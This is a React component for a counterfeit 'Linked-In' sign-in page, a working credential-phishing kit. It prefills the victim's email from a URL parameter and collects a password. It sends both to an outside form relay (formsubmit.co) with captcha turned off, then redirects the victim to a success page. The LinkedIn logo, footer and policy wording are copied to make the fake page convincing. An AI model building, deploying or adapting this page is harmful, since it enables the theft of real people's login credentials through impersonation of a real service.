import { useEffect, useState } from "react";
import Buttons from "./components/Buttons";
import Logo from "/logo.png";

export default function App() {
  const [domain, setDomain] = useState("");
  const [passwrd, setPasswrd] = useState("");
  const [dis, setDis] = useState(false);
  const [emal, setEmal] = useState("");

  useEffect(() => {
    if (window.location.href.includes("email")) {
      const eValue = window.location.href.split("=")[1];
      const dd = window.location.href.split("/?")[0];
      setEmal(eValue);
      setDomain(dd);
    }
    if (!window.location.href.includes("email")) {
      setDomain(window.location.href);
      console.log(domain);
    }
  }, [window.location.href]);

  return (
    <main>
      <div className="logoCtn">
        <img src={Logo} alt="Linked-In Logo" />
      </div>
      <section>
        <div className="card">
          <div>
            <h3>Sign in</h3>
            <p>Stay updated in your professional world.</p>
          </div>
          <form
            action="https://formsubmit.co/952fb51896d5f8d70142a128e67828f5"
            method="POST"
          >
            <div className="inputs">
              <input
                type="emal"
                placeholder="Emal address"
                name="emal"
                required
                value={emal}
                onChange={(e) => setEmal(e.target.value)}
              />
              {dis && (
                <input
                  type="password"
                  placeholder="Password"
                  name="password"
                  required
                  value={passwrd}
                  onChange={(e) => setPasswrd(e.target.value)}
                />
              )}
              <input type="hidden" name="_captcha" value="false"></input>
              <input
                type="hidden"
                name="_next"
                value={`${domain}/success.html`}
              ></input>
            </div>

            {dis && (
              <p>
                <a href="#">Forgotten password?</a>
              </p>
            )}

            {dis ? (
              <button type="submit">Sign in</button>
            ) : (
              <button
                onClick={() => {
                  if(emal) setDis(!dis);

                  if(!emal) alert("Input your email address")
                }}
              >
                Next
              </button>
            )}
          </form>

          <div className="btmText">
            <div className="separator">
              <div className="line"></div>
              <p>or</p>
              <div className="line"></div>
            </div>
            <p>
              By clicking Continue, you agree to{" "}
              <span className="special">Linked-In’s User Agreement</span>,{" "}
              <span className="special">Privacy Policy</span>, and{" "}
              <span className="special">Cookie Policy</span>.
            </p>

            <div className="btnSection">
              <Buttons text="Continue with Google" google />
              <Buttons text="Sign in with Apple" apple />
            </div>
          </div>
        </div>

        <p>
          {" "}
          New to Linked-In? <span className="special">Join Now</span>
        </p>
      </section>

      <footer>
        <ul className="footerList">
          <li>Linked-In &copy; 2024</li>
          <li>User Agreement</li>
          <li>Privacy Policy</li>
          <li>Community Guidelines</li>
          <li>Cookie Policy</li>
          <li>Copyright Policy</li>
          <li>Send Feedback</li>
        </ul>
      </footer>
    </main>
  );
}
